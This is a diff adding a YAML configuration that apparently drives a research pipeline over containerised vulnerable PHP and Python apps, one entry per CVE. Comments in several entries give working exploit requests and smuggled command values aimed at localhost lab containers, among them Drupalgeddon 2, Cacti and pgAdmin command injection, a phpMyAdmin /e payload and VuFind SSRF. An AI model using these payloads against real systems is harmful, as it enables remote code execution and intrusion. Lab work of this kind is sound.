@@ -1,0 +1,275 @@
+# CVE environment configuration
+# Used for pipeline automation
+
+cves:
+# —— PHP ——
+  CVE-2015-8562:
+    language: php
+    version: 5
+    container: cve-2015-8562-env
+    port: 8080
+    use_whitelist: false
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  # phpMyAdmin RCE - arbitrary PHP code execution via preg_replace /e modifier
+  # Prerequisite: PHP < 5.4.7 (supports null byte truncation)
+  # Endpoint: POST /tbl_find_replace.php
+  # Payload: find=0/e\x00 + replaceWith=system('id'); + useRegex=on
+  # Auth: root / root
+  CVE-2016-5734:
+    language: php
+    version: 5
+    container: cve-2016-5734-env
+    port: 8080
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  # Drupal RCE (Drupalgeddon 2) - arbitrary code execution via Form API #post_render
+  # Setup: visit http://localhost:8080 to complete Drupal installation
+  # Verify: curl "http://localhost:8080/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" -d "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
+  CVE-2018-7600:
+    language: php
+    version: 7
+    container: cve-2018-7600-env
+    port: 8080
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  # GitList RCE
+  # Note: need to modify stack_tracer/php7/source/tracer.c
+  # to only trace the src directory, otherwise third-party libraries will be traced
+  CVE-2018-1000533:
+    language: php
+    version: 7
+    container: cve-2018-1000533-env
+    port: 8080
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  # Smarty SSTI RCE
+  # Setup: http://10.1.0.1:8929/MAPU/webfix-expirements/-/blob/main/CVE-2021-26120/CVE-2021-26120/README.zh-cn.md
+  # run chmod a+rw /var/www/html/uploads first!
+  CVE-2021-26120:
+    language: php
+    version: 7
+    container: cve-2021-26120-env
+    port: 80
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+    repair_method: syscall
+
+  # Cacti command injection - via poller_id parameter
+  # Setup: visit http://localhost:8080, login with admin/admin to initialize
+  # Endpoint: GET /remote_agent.php?action=polldata
+  # Payload: poller_id=`id` + X-Forwarded-For: 127.0.0.1
+  # Verify: curl "http://localhost:8080/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=\`id\`" -H "X-Forwarded-For: 127.0.0.1"
+  CVE-2022-46169:
+    language: php
+    version: 7
+    container: cve-2022-46169-web
+    port: 8080
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  # Flarum SSRF - triggers intervention/image to access internal network via avatar upload
+  # Setup: visit http://localhost:8082 to complete Flarum installation
+  CVE-2023-40033:
+    language: php
+    version: 8
+    container: cve-2023-40033-flarum
+    port: 8082
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+    repair_method: network
+
+  # Craft CMS RCE
+  # Setup page: http://10.1.0.220:8088/admin/install
+  # Setup guide: https://github.com/vulhub/vulhub/blob/master/craftcms/CVE-2023-41892/README.zh-cn.md
+  CVE-2023-41892:
+    language: php
+    version: 8
+    container: cve-2023-41892-env
+    port: 8088
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  # VuFind SSRF - access internal network via /vufind/Cover/Show?proxy=
+  # Verify attack: curl -s "http://localhost:8081/vufind/Cover/Show?proxy=http://cve-2024-25737-internal/" | grep "Internal API"
+  # Verify normal: curl -s -o /dev/null -w "%{http_code}" "http://localhost:8081/vufind/Cover/Show?proxy=https://covers.openlibrary.org/b/id/240727-S.jpg"
+  CVE-2024-25737:
+    language: php
+    version: 8
+    container: cve-2024-25737-env
+    port: 8081
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  # VuFind SSRF - access FTP/other protocols via /vufind/Upgrade/GetSourceDir
+  # Setup: visit http://localhost:8080/vufind/Install to complete installation
+  CVE-2024-25738:
+    language: php
+    version: 8
+    container: cve-2024-25738-env
+    port: 8080
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+# —— Python ——
+  # pgAdmin 4.25 command injection - via validate_binary_path
+  # Endpoint: POST /misc/validate_binary_path
+  # Payload: utility_path="/usr/bin/psql\";touch /tmp/pwned;\"
+  # Auth: pgadmin4@pgadmin.org / admin
+  CVE-2022-4223:
+    language: python
+    version: null
+    container: cve-2022-4223-env
+    port: 5050
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  # pgAdmin 7.6 command injection - via validate_binary_path
+  # Endpoint: POST /misc/validate_binary_path
+  # Payload: utility_path="/usr/bin/psql\";touch /tmp/pwned;\""
+  # Auth: vulhub@example.com / vulhub
+  CVE-2023-5002:
+    language: python
+    version: null
+    container: cve-2023-5002-env
+    port: 5050
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  # NLTK pickle deserialization RCE (error)
+  # Endpoint: POST /load_model
+  # Payload: malicious pickle using __reduce__ to execute system commands
+  # Root cause: NLTK uses unsafe pickle.loads() to load model data
+  CVE-2024-39705:
+    language: python
+    version: null
+    container: cve-2024-39705-env
+    port: 5002
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  CVE-2018-16509:
+    language: python
+    version: null
+    container: cve-2018-16509-env
+    port: 8000
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  CVE-2023-37941:
+    language: python
+    version: null
+    container: cve-2023-37941-env
+    port: 8088
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  CVE-2025-2945:
+    language: python
+    version: null
+    container: cve-2025-2945-env
+    port: 5050
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  CVE-2025-31116:
+    language: python
+    version: null
+    container: cve-2025-31116-env
+    port: 8000
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  CVE-2023-47116:
+    language: python
+    version: null
+    container: cve-2023-47116-env
+    port: 8080
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+
+  CVE-2017-18638:
+    language: python
+    version: null
+    container: cve-2017-18638-env
+    port: 8080
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+    python_path: /opt/graphite/bin/python3
+
+  # Plone CMS 4.3-5.2.4 Blind SSRF via RSS Feed Portlet
+  # Attack: specify internal URL via RSS Feed Portlet to trigger server-side request
+  CVE-2021-33926:
+    language: python
+    version: null
+    container: cve-2021-33926-env
+    port: 8080
+    use_whitelist: true
+    manual_install: false
+    filter_irrelevant: true
+    backtrack_repair: null
+    use_attack_flag: true
+    repair_method: network
+    ready_paths:
+      - /Plone/login_form
+    require_ready: true
